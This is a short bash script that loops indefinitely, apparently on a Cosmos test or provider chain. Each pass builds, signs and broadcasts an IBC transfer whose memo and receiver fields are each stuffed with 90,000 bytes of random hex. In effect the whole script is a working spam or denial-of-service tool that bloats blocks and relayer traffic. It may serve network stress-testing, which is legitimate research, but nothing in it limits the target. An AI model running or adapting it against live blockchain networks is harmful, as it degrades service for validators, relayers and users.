set -ue


# Note: each hex is two bytes, 10,000+10,000=40,000.  Gas is 10 per byte, so 400,000 + default tx gas for the ibc send
SEQUENCE=311812
IBCMEMO=45000
RECIEVEADDR=45000
GAS=1900000
ADDRESS=cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq
CHAINID=provider
IBCTIMEOUTS="--packet-timeout-timestamp 0 --packet-timeout-height 0-0"
FEES=4750
UDENOM=uatom
ACCOUNT=490
HOME="/root/.gaia-rs"


while true

do

echo "sequence number is $SEQUENCE"

# Make a new transaction body with a random string
gaiad tx ibc-transfer transfer transfer channel-58 cosmos1fjzgfyt8way9sp7hktnv2jv73j697gvz3fyptm 1$UDENOM  --keyring-backend test --home $HOME --memo $(openssl rand -hex $IBCMEMO) --chain-id $CHAINID --yes $IBCTIMEOUTS --generate-only --fees $FEES$UDENOM --gas $GAS --from $ADDRESS &> bareibctx.json
echo "transaction body generated with $((IBCMEMO*2)) byte ibc memo field"

# Step 1: Generate the random hex string and save it to a temporary file
openssl rand -hex $RECIEVEADDR > tmp.txt
echo "random string generated"

# Step 2: Use jq with --arg to set the receiver field
jq --rawfile random_str tmp.txt '.body.messages[0].receiver = $random_str' bareibctx.json > autobanana.json
echo "$(($RECIEVEADDR*2)) byte random string inserted"

# Step 3: remove the temporary file afterwards
rm tmp.txt
echo "temporary file removed"

# Step 4: Sign the transaction
gaiad tx sign autobanana.json --home $HOME --from $ADDRESS --yes --sequence $SEQUENCE --chain-id provider --keyring-backend test --offline --account-number $ACCOUNT &> ban.json
echo "transaction signed"


# Step 5: Broadcast the transaction
gaiad tx broadcast ban.json --home ~/.gaia-rs > banana.log
cat banana.log
echo "transaction broadcasted"

# Step 6: Check for a sequence number mismatch
	if [ $(grep -c "mismatch" banana.log) -eq 1 ]
	then
		echo "sequence number mismatch"
		break
	fi

# iterate sequence number
SEQUENCE=$(($SEQUENCE+1))

done

echo "if you're running it right the script just restarted"


